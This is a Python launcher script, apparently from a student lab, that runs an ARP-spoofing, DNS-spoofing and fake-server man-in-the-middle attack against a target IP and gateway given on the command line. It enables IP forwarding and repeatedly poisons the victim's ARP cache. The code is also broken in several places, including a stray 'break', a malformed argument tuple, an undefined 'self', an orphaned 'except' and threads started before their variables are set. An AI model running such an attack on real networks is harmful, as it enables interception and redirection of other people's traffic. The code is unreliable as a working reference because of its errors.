#!/usr/bin/env python
import sys
import time
import os
import argparse
from arp import spoof
from dns import dns_spoof
from fake_server import do_GET
from scapy.all import get_if_hwaddr, getmacbyip
import thread
import threading

#python attack_executable.py -t Target_IP -g Gateway_IP -i Interface

parser = argparse.ArgumentParser()

#-t Target_IP  -g Gateway_IP -i Interface 
parser.add_argument("-t", "--target", help="Target_IP")
parser.add_argument("-g", "--gateway", help="Gateway_IP")
parser.add_argument("-i", "--interface", help="Interface")

args = parser.parse_args()

if not (args.target and args.gateway and args.interface):
    print("Wrong/insufficient input parameters to the command")
    print(parser.format_help())
    break

# Create three threads as follows
try:
    run_event = threading.Event()
    run_event.set()
    t1 = thread.start_new_thread(spoof, ("Start thread for ARP Spoof", mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface, ) )
    t2 = thread.start_new_thread(dns_spoof, ("Start thread for DNS Spoof", , ) )
    t3 = thread.start_new_thread(do_GET, ("Start thread for Fake Server", self, ) )
except:
    print "Error: unable to start thread"

if __name__ == "__main__":
    print("Enabling ip forwarding")
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
    # iface = "enp0s3"
    iface = args.interface
    mac_attacker = get_if_hwaddr(iface)
    # Leon's victim
    # ip_victim = "192.168.192.16"
    # ip_victim = "192.168.192.7"
    ip_victim = args.target
    # Karolina's victim
    # ip_victim = "192.168.0.39"
    # mac_victim = get_mac(ip_victim, iface)
    mac_victim = getmacbyip(ip_victim)
    print(mac_victim)
    # Leon's gateway
    ip_to_spoof = args.gateway
    # Karolina's gateway
    # ip_to_spoof = "192.168.0.1"

    while True:
        spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface)
        time.sleep(1)
        except KeyboardInterrupt:
            print ("Attempt to close threads")
            run_event.clear()
            t1.join()
            t2.join()
            t3.join()
            print "Threads successfully closed"



